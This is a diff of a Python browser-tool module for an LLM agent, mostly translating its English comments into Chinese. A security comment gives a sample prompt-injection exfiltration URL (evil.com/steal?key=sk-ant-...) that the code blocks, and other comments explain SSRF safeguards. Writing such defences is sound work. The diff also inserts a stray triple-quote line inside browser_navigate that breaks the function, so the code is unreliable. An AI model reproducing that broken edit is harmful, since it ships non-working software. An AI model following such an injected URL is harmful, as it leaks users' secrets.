@@ -1,51 +1,51 @@
 #!/usr/bin/env python3
 """
-Browser Tool Module
+浏览器工具模块
 
-This module provides browser automation tools using agent-browser CLI.  It
-supports multiple backends — **Browser Use** (cloud, default for Nous
-subscribers), **Browserbase** (cloud, direct credentials), and **local
-Chromium** — with identical agent-facing behaviour.  The backend is
-auto-detected from config and available credentials.
+本模块使用 agent-browser CLI 提供浏览器自动化工具。支持
+多个后端——**Browser Use**（云端，Nous 订阅者的默认选项）、
+**Browserbase**（云端，直接凭据）和**本地
+Chromium**——具有相同的代理面向行为。后端从
+配置和可用凭据自动检测。
 
-The tool uses agent-browser's accessibility tree (ariaSnapshot) for text-based
-page representation, making it ideal for LLM agents without vision capabilities.
+该工具使用 agent-browser 的可访问性树（ariaSnapshot）进行基于文本的
+页面表示，非常适合没有视觉能力的 LLM 代理。
 
-Features:
-- **Local mode** (default): zero-cost headless Chromium via agent-browser.
-  Works on Linux servers without a display.  One-time setup:
-  ``agent-browser install`` (downloads Chromium) or
-  ``agent-browser install --with-deps`` (also installs system libraries for
-  Debian/Ubuntu/Docker).
-- **Cloud mode**: Browserbase or Browser Use cloud execution when configured.
-- Session isolation per task ID
-- Text-based page snapshots using accessibility tree
-- Element interaction via ref selectors (@e1, @e2, etc.)
-- Task-aware content extraction using LLM summarization
-- Automatic cleanup of browser sessions
+特性：
+- **本地模式**（默认）：通过 agent-browser 实现零成本无头 Chromium。
+  可在无显示器的 Linux 服务器上工作。一次设置：
+  ``agent-browser install``（下载 Chromium）或
+  ``agent-browser install --with-deps``（还为
+  Debian/Ubuntu/Docker 安装系统库）。
+- **云端模式**：配置时使用 Browserbase 或 Browser Use 云端执行。
+- 每次任务 ID 的会话隔离
+- 使用可访问性树的基于文本的页面快照
+- 通过引用选择器（@e1、@e2 等）进行元素交互
+- 使用 LLM 摘要进行任务感知内容提取
+- 自动清理浏览器会话
 
-Environment Variables:
-- BROWSERBASE_API_KEY: API key for direct Browserbase cloud mode
-- BROWSERBASE_PROJECT_ID: Project ID for direct Browserbase cloud mode
-- BROWSER_USE_API_KEY: API key for direct Browser Use cloud mode
-- BROWSERBASE_PROXIES: Enable/disable residential proxies (default: "true")
-- BROWSERBASE_ADVANCED_STEALTH: Enable advanced stealth mode with custom Chromium,
-  requires Scale Plan (default: "false")
-- BROWSERBASE_KEEP_ALIVE: Enable keepAlive for session reconnection after disconnects,
-  requires paid plan (default: "true")
-- BROWSERBASE_SESSION_TIMEOUT: Custom session timeout in milliseconds. Set to extend
-  beyond project default. Common values: 600000 (10min), 1800000 (30min) (default: none)
+环境变量：
+- BROWSERBASE_API_KEY：直接 Browserbase 云模式的 API 密钥
+- BROWSERBASE_PROJECT_ID：直接 Browserbase 云模式的项目 ID
+- BROWSER_USE_API_KEY：直接 Browser Use 云模式的 API 密钥
+- BROWSERBASE_PROXIES：启用/禁用住宅代理（默认："true"）
+- BROWSERBASE_ADVANCED_STEALTH：使用自定义 Chromium 启用高级隐身模式，
+  需要 Scale Plan（默认："false"）
+- BROWSERBASE_KEEP_ALIVE：在断开连接后启用 keepAlive 以便会话重新连接，
+  需要付费计划（默认："true"）
+- BROWSERBASE_SESSION_TIMEOUT：自定义会话超时（毫秒）。设置以延长
+  超出项目默认值。常用值：600000（10 分钟）、1800000（30 分钟）（默认：无）
 
-Usage:
+用法：
     from tools.browser_tool import browser_navigate, browser_snapshot, browser_click
-    
-    # Navigate to a page
+
+    # 导航到页面
     result = browser_navigate("https://example.com", task_id="task_123")
-    
-    # Get page snapshot
+
+    # 获取页面快照
     snapshot = browser_snapshot(task_id="task_123")
-    
-    # Click an element
+
+    # 点击元素
     browser_click("@e5", task_id="task_123")
 """
 
@@ -82,9 +82,9 @@ from tools.browser_providers.browser_use import BrowserUseProvider
 from tools.browser_providers.firecrawl import FirecrawlProvider
 from tools.tool_backend_helpers import normalize_browser_cloud_provider
 
-# Camofox local anti-detection browser backend (optional).
-# When CAMOFOX_URL is set, all browser operations route through the
-# camofox REST API instead of the agent-browser CLI.
+# Camofox 本地反检测浏览器后端（可选）。
+# 当设置 CAMOFOX_URL 时，所有浏览器操作通过
+# camofox REST API 路由，而不是 agent-browser CLI。
 try:
     from tools.browser_camofox import is_camofox_mode as _is_camofox_mode
 except ImportError:
@@ -92,8 +92,8 @@ except ImportError:
 
 logger = logging.getLogger(__name__)
 
-# Standard PATH entries for environments with minimal PATH (e.g. systemd services).
-# Includes macOS Homebrew paths (/opt/homebrew/* for Apple Silicon).
+# 标准 PATH 条目，用于 PATH 最少的环境（例如 systemd 服务）。
+# 包括 macOS Homebrew 路径（Apple Silicon 的 /opt/homebrew/*）。
 _SANE_PATH = (
     "/opt/homebrew/bin:/opt/homebrew/sbin:"
     "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
@@ -101,11 +101,11 @@ _SANE_PATH = (
 
 
 def _discover_homebrew_node_dirs() -> list[str]:
-    """Find Homebrew versioned Node.js bin directories (e.g. node@20, node@24).
+    """查找 Homebrew 版本化 Node.js bin 目录（例如 node@20、node@24）。
 
-    When Node is installed via ``brew install node@24`` and NOT linked into
-    /opt/homebrew/bin, the binary lives only in /opt/homebrew/opt/node@24/bin/.
-    This function discovers those paths so they can be added to subprocess PATH.
+    当通过 ``brew install node@24`` 安装 Node 且未链接到
+    /opt/homebrew/bin 时，二进制文件仅存在于 /opt/homebrew/opt/node@24/bin/。
+    此函数发现这些路径，以便可以将它们添加到子进程 PATH。
     """
     dirs: list[str] = []
     homebrew_opt = "/opt/homebrew/opt"
@@ -122,28 +122,28 @@ def _discover_homebrew_node_dirs() -> list[str]:
         pass
     return dirs
 
-# Throttle screenshot cleanup to avoid repeated full directory scans.
+# 节流截图清理以避免重复的完整目录扫描。
 _last_screenshot_cleanup_by_dir: dict[str, float] = {}
 
 # ============================================================================
-# Configuration
+# 配置
 # ============================================================================
 
-# Default timeout for browser commands (seconds)
+# 浏览器命令的默认超时（秒）
 DEFAULT_COMMAND_TIMEOUT = 30
 
-# Default session timeout (seconds)
+# 默认会话超时（秒）
 DEFAULT_SESSION_TIMEOUT = 300
 
-# Max tokens for snapshot content before summarization
+# 摘要前快照内容的最大 token 数
 SNAPSHOT_SUMMARIZE_THRESHOLD = 8000
 
 
 def _get_command_timeout() -> int:
-    """Return the configured browser command timeout from config.yaml.
+    """从 config.yaml 返回配置的浏览器命令超时。
 
-    Reads ``config["browser"]["command_timeout"]`` and falls back to
-    ``DEFAULT_COMMAND_TIMEOUT`` (30s) if unset or unreadable.
+    读取 ``config["browser"]["command_timeout"]`` 并回退到
+    ``DEFAULT_COMMAND_TIMEOUT``（30s）（如果未设置或无法读取）。
     """
     try:
         from kclaw_cli.config import read_raw_config
@@ -157,26 +157,26 @@ def _get_command_timeout() -> int:
 
 
 def _get_vision_model() -> Optional[str]:
-    """Model for browser_vision (screenshot analysis — multimodal)."""
+    """browser_vision 的模型（截图分析——多模态）。"""
     return os.getenv("AUXILIARY_VISION_MODEL", "").strip() or None
 
 
 def _get_extraction_model() -> Optional[str]:
-    """Model for page snapshot text summarization — same as web_extract."""
+    """页面快照文本摘要的模型——与 web_extract 相同。"""
     return os.getenv("AUXILIARY_WEB_EXTRACT_MODEL", "").strip() or None
 
 
 def _resolve_cdp_override(cdp_url: str) -> str:
-    """Normalize a user-supplied CDP endpoint into a concrete connectable URL.
+    """将用户提供的 CDP 端点规范化为具体可连接的 URL。
 
-    Accepts:
-    - full websocket endpoints: ws://host:port/devtools/browser/...
-    - HTTP discovery endpoints: http://host:port or http://host:port/json/version
-    - bare websocket host:port values like ws://host:port
+    接受：
+    - 完整 websocket 端点：ws://host:port/devtools/browser/...
+    - HTTP 发现端点：http://host:port 或 http://host:port/json/version
+    - 裸 websocket host:port 值如 ws://host:port
 
-    For discovery-style endpoints we fetch /json/version and return the
-    webSocketDebuggerUrl so downstream tools always receive a concrete browser
-    websocket instead of an ambiguous host:port URL.
+    对于发现式端点，我们获取 /json/version 并返回
+    webSocketDebuggerUrl，以便下游工具始终收到具体的浏览器
+    websocket 而不是模糊的 host:port URL。
     """
     raw = (cdp_url or "").strip()
     if not raw:
@@ -216,17 +216,17 @@ def _resolve_cdp_override(cdp_url: str) -> str:
 
 
 def _get_cdp_override() -> str:
-    """Return a normalized user-supplied CDP URL override, or empty string.
+    """返回规范化的用户提供的 CDP URL 覆盖，或空字符串。
 
-    When ``BROWSER_CDP_URL`` is set (e.g. via ``/browser connect``), we skip
-    both Browserbase and the local headless launcher and connect directly to
-    the supplied Chrome DevTools Protocol endpoint.
+    当设置了 ``BROWSER_CDP_URL``（例如通过 ``/browser connect``）时，
+    我们跳过 Browserbase 和本地无头启动器，直接连接到
+    提供的 Chrome DevTools Protocol 端点。
     """
     return _resolve_cdp_override(os.environ.get("BROWSER_CDP_URL", ""))
 
 
 # ============================================================================
-# Cloud Provider Registry
+# 云提供商注册表
 # ============================================================================
 
 _PROVIDER_REGISTRY: Dict[str, type] = {
@@ -242,12 +242,12 @@ _cached_allow_private_urls: Optional[bool] = None
 
 
 def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
-    """Return the configured cloud browser provider, or None for local mode.
+    """返回配置的云浏览器提供商，本地模式则返回 None。
 
-    Reads ``config["browser"]["cloud_provider"]`` once and caches the result
-    for the process lifetime. An explicit ``local`` provider disables cloud
-    fallback. If unset, fall back to Browserbase when direct or managed
-    Browserbase credentials are available.
+    读取 ``config["browser"]["cloud_provider"]`` 一次并缓存结果
+    供进程生命周期使用。显式 ``local`` 提供商禁用云
+    回退。如果未设置，在直接或托管
+    Browserbase 凭据可用时回退到 Browserbase。
     """
     global _cached_cloud_provider, _cloud_provider_resolved
     if _cloud_provider_resolved:
@@ -286,30 +286,30 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
 
 
 def _is_local_mode() -> bool:
-    """Return True when the browser tool will use a local browser backend."""
+    """当浏览器工具将使用本地浏览器后端时返回 True。"""
     if _get_cdp_override():
         return False
     return _get_cloud_provider() is None
 
 
 def _is_local_backend() -> bool:
-    """Return True when the browser runs locally (no cloud provider).
+    """当浏览器在本地运行时返回 True（无云提供商）。
 
-    SSRF protection is only meaningful for cloud backends (Browserbase,
-    BrowserUse) where the agent could reach internal resources on a remote
-    machine.  For local backends — Camofox, or the built-in headless
-    Chromium without a cloud provider — the user already has full terminal
-    and network access on the same machine, so the check adds no security
-    value.
+    SSRF 保护仅对云后端（Browserbase、BrowserUse）有意义，
+    因为代理可以访问远程机器上的内部资源。对于本地后端——
+    Camofox，或没有云提供商的内置无头
+    Chromium——用户已经在同一台机器上拥有完整的终端
+    和网络访问权限，因此该检查不会增加安全
+    价值。
     """
     return _is_camofox_mode() or _get_cloud_provider() is None
 
 
 def _allow_private_urls() -> bool:
-    """Return whether the browser is allowed to navigate to private/internal addresses.
+    """返回浏览器是否被允许导航到私有/内部地址。
 
-    Reads ``config["browser"]["allow_private_urls"]`` once and caches the result
-    for the process lifetime.  Defaults to ``False`` (SSRF protection active).
+    读取 ``config["browser"]["allow_private_urls"]`` 一次并缓存结果
+    供进程生命周期使用。默认为 ``False``（SSRF 保护活动）。
     """
     global _cached_allow_private_urls, _allow_private_urls_resolved
     if _allow_private_urls_resolved:
@@ -327,54 +327,55 @@ def _allow_private_urls() -> bool:
 
 
 def _socket_safe_tmpdir() -> str:
-    """Return a short temp directory path suitable for Unix domain sockets.
+    """返回一个适合 Unix 域套接字的短临时目录路径。
 
-    macOS sets ``TMPDIR`` to ``/var/folders/xx/.../T/`` (~51 chars).  When we
-    append ``agent-browser-kclaw_…`` the resulting socket path exceeds the
-    104-byte macOS limit for ``AF_UNIX`` addresses, causing agent-browser to
-    fail with "Failed to create socket directory" or silent screenshot failures.
+    macOS 将 ``TMPDIR`` 设置为 ``/var/folders/xx/.../T/``（约 51 个字符）。
+    当我们附加 ``agent-browser-kclaw_…`` 时，
+    生成的套接字路径超过 macOS ``AF_UNIX``
+    地址的 104 字节限制，导致 agent-browser
+    失败，出现"无法创建套接字目录"或静默截图失败。
 
-    Linux ``tempfile.gettempdir()`` already returns ``/tmp``, so this is a
-    no-op there.  On macOS we bypass ``TMPDIR`` and use ``/tmp`` directly
-    (symlink to ``/private/tmp``, sticky-bit protected, always available).
+    Linux ``tempfile.gettempdir()`` 已经返回 ``/tmp``，所以在那里是
+    无操作。在 macOS 上，我们绕过 ``TMPDIR`` 直接使用 ``/tmp``
+    （符号链接到 ``/private/tmp``，粘性位保护，始终可用）。
     """
     if sys.platform == "darwin":
         return "/tmp"
     return tempfile.gettempdir()
 
 
-# Track active sessions per task
-# Stores: session_name (always), bb_session_id + cdp_url (cloud mode only)
+# 跟踪每个任务的活动会话
+# 存储：session_name（始终）、bb_session_id + cdp_url（仅云模式）
 _active_sessions: Dict[str, Dict[str, str]] = {}  # task_id -> {session_name, ...}
-_recording_sessions: set = set()  # task_ids with active recordings
+_recording_sessions: set = set()  # 带活动录制的 task_ids
 
-# Flag to track if cleanup has been done
+# 跟踪清理是否完成的标志
 _cleanup_done = False
 
 # =============================================================================
-# Inactivity Timeout Configuration
+#  inactivity 超时配置
 # =============================================================================
 
-# Session inactivity timeout (seconds) - cleanup if no activity for this long
-# Default: 5 minutes. Needs headroom for LLM reasoning between browser commands,
-# especially when subagents are doing multi-step browser tasks.
+# 会话 inactivity 超时（秒）——如果这么长时间没有活动则清理
+# 默认：5 分钟。需要为 LLM 在浏览器命令之间留出推理空间，
+# 特别是当子代理执行多步骤浏览器任务时。
 BROWSER_SESSION_INACTIVITY_TIMEOUT = int(os.environ.get("BROWSER_INACTIVITY_TIMEOUT", "300"))
 
-# Track last activity time per session
+# 跟踪每个会话的最后活动时间
 _session_last_activity: Dict[str, float] = {}
 
-# Background cleanup thread state
+# 后台清理线程状态
 _cleanup_thread = None
 _cleanup_running = False
-# Protects _session_last_activity AND _active_sessions for thread safety
-# (subagents run concurrently via ThreadPoolExecutor)
+# 保护 _session_last_activity 和 _active_sessions 的线程安全
+#（子代理通过 ThreadPoolExecutor 并发运行）
 _cleanup_lock = threading.Lock()
 
 
 def _emergency_cleanup_all_sessions():
     """
-    Emergency cleanup of all active browser sessions.
-    Called on process exit or interrupt to prevent orphaned sessions.
+    所有活动浏览器会话的紧急清理。
+    在进程退出或中断时调用以防止孤立会话。
     """
     global _cleanup_done
     if _cleanup_done:
@@ -398,26 +399,26 @@ def _emergency_cleanup_all_sessions():
         _recording_sessions.clear()
 
 
-# Register cleanup via atexit only.  Previous versions installed SIGINT/SIGTERM
-# handlers that called sys.exit(), but this conflicts with prompt_toolkit's
-# async event loop — a SystemExit raised inside a key-binding callback
-# corrupts the coroutine state and makes the process unkillable.  atexit
-# handlers run on any normal exit (including sys.exit), so browser sessions
-# are still cleaned up without hijacking signals.
+# 仅通过 atexit 注册清理。之前版本安装了 SIGINT/SIGTERM
+# 处理程序调用 sys.exit()，但这与 prompt_toolkit 的
+# 异步事件循环冲突——在密钥绑定回调中引发的 SystemExit
+# 会破坏协程状态并使进程无法终止。atexit
+# 处理程序在任何正常退出时运行（包括 sys.exit），
+# 因此浏览器会话仍然会被清理而不劫持信号。
 atexit.register(_emergency_cleanup_all_sessions)
 
 
 # =============================================================================
-# Inactivity Cleanup Functions
+# Inactivity 清理函数
 # =============================================================================
 
 def _cleanup_inactive_browser_sessions():
     """
-    Clean up browser sessions that have been inactive for longer than the timeout.
-    
-    This function is called periodically by the background cleanup thread to
-    automatically close sessions that haven't been used recently, preventing
-    orphaned sessions (local or Browserbase) from accumulating.
+    清理已处于非活动状态超过超时的浏览器会话。
+
+    此函数由后台清理线程定期调用，以
+    自动关闭最近未使用的会话，防止孤立会话
+    （本地或 Browserbase）积累。
     """
     current_time = time.time()
     sessions_to_cleanup = []
@@ -441,10 +442,10 @@ def _cleanup_inactive_browser_sessions():
 
 def _browser_cleanup_thread_worker():
     """
-    Background thread that periodically cleans up inactive browser sessions.
-    
-    Runs every 30 seconds and checks for sessions that haven't been used
-    within the BROWSER_SESSION_INACTIVITY_TIMEOUT period.
+    定期清理非活动浏览器会话的后台线程。
+
+    每 30 秒运行一次，并检查在
+    BROWSER_SESSION_INACTIVITY_TIMEOUT 期间内未使用的会话。
     """
     while _cleanup_running:
         try:
@@ -460,7 +461,7 @@ def _browser_cleanup_thread_worker():
 
 
 def _start_browser_cleanup_thread():
-    """Start the background cleanup thread if not already running."""
+    """如果后台清理线程尚未运行，则启动它。"""
     global _cleanup_thread, _cleanup_running
     
     with _cleanup_lock:
@@ -476,7 +477,7 @@ def _start_browser_cleanup_thread():
 
 
 def _stop_browser_cleanup_thread():
-    """Stop the background cleanup thread."""
+    """停止后台清理线程。"""
     global _cleanup_running
     _cleanup_running = False
     if _cleanup_thread is not None:
@@ -484,17 +485,17 @@ def _stop_browser_cleanup_thread():
 
 
 def _update_session_activity(task_id: str):
-    """Update the last activity timestamp for a session."""
+    """更新会话的最后活动时间戳。"""
     with _cleanup_lock:
         _session_last_activity[task_id] = time.time()
 
 
-# Register cleanup thread stop on exit
+# 在退出时注册清理线程停止
 atexit.register(_stop_browser_cleanup_thread)
 
 
 # ============================================================================
-# Tool Schemas
+# 工具 Schema
 # ============================================================================
 
 BROWSER_TOOL_SCHEMAS = [
@@ -657,7 +658,7 @@ BROWSER_TOOL_SCHEMAS = [
 
 
 # ============================================================================
-# Utility Functions
+# 工具函数
 # ============================================================================
 
 def _create_local_session(task_id: str) -> Dict[str, str]:
@@ -689,34 +690,34 @@ def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
 
 def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
     """
-    Get or create session info for the given task.
-    
-    In cloud mode, creates a Browserbase session with proxies enabled.
-    In local mode, generates a session name for agent-browser --session.
-    Also starts the inactivity cleanup thread and updates activity tracking.
-    Thread-safe: multiple subagents can call this concurrently.
-    
-    Args:
-        task_id: Unique identifier for the task
-        
-    Returns:
-        Dict with session_name (always), bb_session_id + cdp_url (cloud only)
+    获取或创建给定任务的会话信息。
+
+    在云模式下，创建启用代理的 Browserbase 会话。
+    在本地模式下，为 agent-browser --session 生成会话名称。
+    还启动 inactivity 清理线程并更新活动跟踪。
+    线程安全：多个子代理可以并发调用此函数。
+
+    参数：
+        task_id: 任务的唯一标识符
+
+    返回：
+        带 session_name（始终）的字典，bb_session_id + cdp_url（仅云）
     """
     if task_id is None:
         task_id = "default"
-    
-    # Start the cleanup thread if not running (handles inactivity timeouts)
+
+    # 如果清理线程未运行则启动它（处理 inactivity 超时）
     _start_browser_cleanup_thread()
-    
-    # Update activity timestamp for this session
+
+    # 更新此会话的活动时间戳
     _update_session_activity(task_id)
-    
+
     with _cleanup_lock:
-        # Check if we already have a session for this task
+        # 检查我们是否已为此任务设置了会话
         if task_id in _active_sessions:
             return _active_sessions[task_id]
-    
-    # Create session outside the lock (network call in cloud mode)
+
+    # 在锁外创建会话（云模式下的网络调用）
     cdp_override = _get_cdp_override()
     if cdp_override:
         session_info = _create_cdp_session(task_id, cdp_override)
@@ -727,44 +728,43 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
         else:
             session_info = provider.create_session(task_id)
             if session_info.get("cdp_url"):
-                # Some cloud providers (including Browser-Use v3) return an HTTP
-                # CDP discovery URL instead of a raw websocket endpoint.
+                # 一些云提供商（包括 Browser-Use v3）返回 HTTP
+                # CDP 发现 URL 而不是原始 websocket 端点。
                 session_info = dict(session_info)
                 session_info["cdp_url"] = _resolve_cdp_override(str(session_info["cdp_url"]))
-    
+
     with _cleanup_lock:
-        # Double-check: another thread may have created a session while we
-        # were doing the network call. Use the existing one to avoid leaking
-        # orphan cloud sessions.
+        # 双重检查：当我们进行网络调用时，另一线程可能已创建了会话。
+        # 使用现有的以避免泄漏孤立的云会话。
         if task_id in _active_sessions:
             return _active_sessions[task_id]
         _active_sessions[task_id] = session_info
-    
+
     return session_info
 
 
 
 def _find_agent_browser() -> str:
     """
-    Find the agent-browser CLI executable.
-    
-    Checks in order: current PATH, Homebrew/common bin dirs, KClaw-managed
-    node, local node_modules/.bin/, npx fallback.
-    
-    Returns:
-        Path to agent-browser executable
-        
-    Raises:
-        FileNotFoundError: If agent-browser is not installed
+    查找 agent-browser CLI 可执行文件。
+
+    按顺序检查：当前 PATH、Homebrew/常见 bin 目录、KClaw 管理的
+    node、local node_modules/.bin/、npx 后备。
+
+    返回：
+        agent-browser 可执行文件的路径
+
+    抛出：
+        FileNotFoundError：如果 agent-browser 未安装
     """
 
-    # Check if it's in PATH (global install)
+    # 检查它是否在 PATH 中（全局安装）
     which_result = shutil.which("agent-browser")
     if which_result:
         return which_result
 
-    # Build an extended search PATH including Homebrew and KClaw-managed dirs.
-    # This covers macOS where the process PATH may not include Homebrew paths.
+    # 构建包含 Homebrew 和 KClaw 管理目录的扩展搜索 PATH。
+    # 这覆盖了进程 PATH 可能不包含 Homebrew 路径的 macOS。
     extra_dirs: list[str] = []
     for d in ["/opt/homebrew/bin", "/usr/local/bin"]:
         if os.path.isdir(d):
@@ -782,7 +782,7 @@ def _find_agent_browser() -> str:
         if which_result:
             return which_result
 
-    # Check local node_modules/.bin/ (npm install in repo root)
+    # 检查本地 node_modules/.bin/（在仓库根目录的 npm install）
     repo_root = Path(__file__).parent.parent
     local_bin = repo_root / "node_modules" / ".bin" / "agent-browser"
     if local_bin.exists():
@@ -803,7 +803,7 @@ def _find_agent_browser() -> str:
 
 
 def _extract_screenshot_path_from_text(text: str) -> Optional[str]:
-    """Extract a screenshot file path from agent-browser human-readable output."""
+    """从 agent-browser 人类可读的输出中提取截图文件路径。"""
     if not text:
         return None
 
@@ -830,17 +830,17 @@ def _run_browser_command(
     timeout: Optional[int] = None,
 ) -> Dict[str, Any]:
     """
-    Run an agent-browser CLI command using our pre-created Browserbase session.
-    
-    Args:
-        task_id: Task identifier to get the right session
-        command: The command to run (e.g., "open", "click")
-        args: Additional arguments for the command
-        timeout: Command timeout in seconds.  ``None`` reads
-                 ``browser.command_timeout`` from config (default 30s).
-        
-    Returns:
-        Parsed JSON response from agent-browser
+    使用我们预先创建的 Browserbase 会话运行 agent-browser CLI 命令。
+
+    参数：
+        task_id: 任务标识符以获取正确的会话
+        command: 要运行的命令（例如，"open"、"click"）
+        args: 命令的附加参数
+        timeout: 命令超时（秒）。``None`` 读取
+                 配置中的 ``browser.command_timeout``（默认 30s）。
+
+    返回：
+        来自 agent-browser 的解析 JSON 响应
     """
     if timeout is None:
         timeout = _get_command_timeout()
@@ -864,10 +864,10 @@ def _run_browser_command(
         logger.warning("Failed to create browser session for task=%s: %s", task_id, e)
         return {"success": False, "error": f"Failed to create browser session: {str(e)}"}
     
-    # Build the command with the appropriate backend flag.
-    # Cloud mode: --cdp <websocket_url> connects to Browserbase.
-    # Local mode: --session <name> launches a local headless Chromium.
-    # The rest of the command (--json, command, args) is identical.
+    # 使用适当的后端标志构建命令。
+    # 云模式：--cdp <websocket_url> 连接到 Browserbase。
+    # 本地模式：--session <name> 启动本地无头 Chromium。
+    # 命令的其余部分（--json、command、args）是相同的。
     if session_info.get("cdp_url"):
         # Cloud mode — connect to remote Browserbase browser via CDP
         # IMPORTANT: Do NOT use --session with --cdp. In agent-browser >=0.13,
@@ -887,9 +887,9 @@ def _run_browser_command(
     ] + args
     
     try:
-        # Give each task its own socket directory to prevent concurrency conflicts.
-        # Without this, parallel workers fight over the same default socket path,
-        # causing "Failed to create socket directory: Permission denied" errors.
+        # 给每个任务自己的套接字目录以防止并发冲突。
+        # 没有这个，并行工作进程会争夺相同的默认套接字路径，
+        # 导致"无法创建套接字目录：权限被拒绝"错误。
         task_socket_dir = os.path.join(
             _socket_safe_tmpdir(),
             f"agent-browser-{session_info['session_name']}"
@@ -920,11 +920,11 @@ def _run_browser_command(
         browser_env["PATH"] = ":".join(path_parts)
         browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir
         
-        # Use temp files for stdout/stderr instead of pipes.
-        # agent-browser starts a background daemon that inherits file
-        # descriptors.  With capture_output=True (pipes), the daemon keeps
-        # the pipe fds open after the CLI exits, so communicate() never
-        # sees EOF and blocks until the timeout fires.
+        # 使用临时文件代替管道处理 stdout/stderr。
+        # agent-browser 启动一个继承文件描述符的后台守护进程。
+        # 使用 capture_output=True（管道），守护进程在 CLI 退出后保持
+        # 管道 fd 打开，因此 communicate() 永远看不到 EOF，
+        # 并阻塞直到超时触发。
         stdout_path = os.path.join(task_socket_dir, f"_stdout_{command}")
         stderr_path = os.path.join(task_socket_dir, f"_stderr_{command}")
         stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
@@ -963,12 +963,12 @@ def _run_browser_command(
             except OSError:
                 pass
 
-        # Log stderr for diagnostics — use warning level on failure so it's visible
+        # 记录 stderr 用于诊断——在失败时使用警告级别以便可见
         if stderr and stderr.strip():
             level = logging.WARNING if returncode != 0 else logging.DEBUG
             logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])
-        
-        # Log empty output as warning — common sign of broken agent-browser
+
+        # 将空输出记录为警告——agent-browser 损坏的常见迹象
         if not stdout.strip() and returncode == 0:
             logger.warning("browser '%s' returned empty stdout with rc=0. "
                            "cmd=%s stderr=%s",
@@ -980,7 +980,7 @@ def _run_browser_command(
         if stdout_text:
             try:
                 parsed = json.loads(stdout_text)
-                # Warn if snapshot came back empty (common sign of daemon/CDP issues)
+                # 如果快照返回为空则发出警告（守护进程/CDP 问题的常见迹象）
                 if command == "snapshot" and parsed.get("success"):
                     snap_data = parsed.get("data", {})
                     if not snap_data.get("snapshot") and not snap_data.get("refs"):
@@ -1035,9 +1035,9 @@ def _extract_relevant_content(
     snapshot_text: str,
     user_task: Optional[str] = None
 ) -> str:
-    """Use LLM to extract relevant content from a snapshot based on the user's task.
+    """使用 LLM 根据用户任务从快照中提取相关内容。
 
-    Falls back to simple truncation when no auxiliary text model is configured.
+    当没有配置辅助文本模型时回退到简单截断。
     """
     if user_task:
         extraction_prompt = (
@@ -1062,10 +1062,10 @@ def _extract_relevant_content(
             f"Provide a concise summary focused on interactive elements and key content."
         )
 
-    # Redact secrets from snapshot before sending to auxiliary LLM.
-    # Without this, a page displaying env vars or API keys would leak
-    # secrets to the extraction model before run_agent.py's general
-    # redaction layer ever sees the tool result.
+    # 在发送到辅助 LLM 之前从快照中删除秘密。
+    # 没有这个，显示环境变量或 API 密钥的页面会泄露
+    # 秘密给提取模型，而 run_agent.py 的一般
+    # 删除层还没有看到工具结果。
     from agent.redact import redact_sensitive_text
     extraction_prompt = redact_sensitive_text(extraction_prompt)
 
@@ -1089,14 +1089,14 @@ def _extract_relevant_content(
 
 def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
     """
-    Simple truncation fallback for snapshots.
-    
-    Args:
-        snapshot_text: The snapshot text to truncate
-        max_chars: Maximum characters to keep
-        
-    Returns:
-        Truncated text with indicator if truncated
+    快照的简单截断后备。
+
+    参数：
+        snapshot_text: 要截断的快照文本
+        max_chars: 保留的最大字符数
+
+    返回：
+        如果被截断则带指示器的截断文本
     """
     if len(snapshot_text) <= max_chars:
         return snapshot_text
@@ -1105,23 +1105,23 @@ def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
 
 
 # ============================================================================
-# Browser Tool Functions
+# 浏览器工具函数
 # ============================================================================
 
 def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     """
-    Navigate to a URL in the browser.
-    
-    Args:
-        url: The URL to navigate to
-        task_id: Task identifier for session isolation
-        
-    Returns:
-        JSON string with navigation result (includes stealth features info on first nav)
+    在浏览器中导航到 URL。
+
+    参数：
+        url: 要导航到的 URL
+        task_id: 用于会话隔离的任务标识符
+
+    返回：
+        带导航结果的 JSON 字符串（首次导航时包含隐身功能信息）
     """
-    # Secret exfiltration protection — block URLs that embed API keys or
-    # tokens in query parameters. A prompt injection could trick the agent
-    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
+    # 秘密泄露保护——阻止在查询参数中嵌入 API 密钥或
+    # 令牌的 URL。提示注入可能诱骗代理
+    # 导航到 https://evil.com/steal?key=sk-ant-... 以泄露秘密。
     from agent.redact import _PREFIX_RE
     if _PREFIX_RE.search(url):
         return json.dumps({
@@ -1130,11 +1130,12 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
                      "Secrets must not be sent in URLs.",
         })
 
-    # SSRF protection — block private/internal addresses before navigating.
-    # Skipped for local backends (Camofox, headless Chromium without a cloud
-    # provider) because the agent already has full local network access via
-    # the terminal tool.  Can also be opted out for cloud mode via
-    # ``browser.allow_private_urls`` in config.
+    # SSRF 保护——在导航前阻止私有/内部地址。
+    # 跳过本地后端（Camofox、没有云提供商的
+    # 无头 Chromium），因为代理已经通过终端工具拥有完整的
+    # 本地网络访问权限。也可以通过
+    # 配置中的 ``browser.allow_private_urls`` 为云模式选择退出。
+    """
     if not _is_local_backend() and not _allow_private_urls() and not _is_safe_url(url):
         return json.dumps({
             "success": False,
@@ -1174,10 +1175,10 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         title = data.get("title", "")
         final_url = data.get("url", url)
 
-        # Post-redirect SSRF check — if the browser followed a redirect to a
-        # private/internal address, block the result so the model can't read
-        # internal content via subsequent browser_snapshot calls.
-        # Skipped for local backends (same rationale as the pre-nav check).
+            # 重定向后 SSRF 检查——如果浏览器跟随重定向到
+        # 私有/内部地址，阻止结果以便模型无法通过后续
+        # browser_snapshot 调用读取内部内容。
+        # 跳过本地后端（与导航前检查相同的理由）。
         if not _is_local_backend() and not _allow_private_urls() and final_url and final_url != url and not _is_safe_url(final_url):
             # Navigate away to a blank page to prevent snapshot leaks
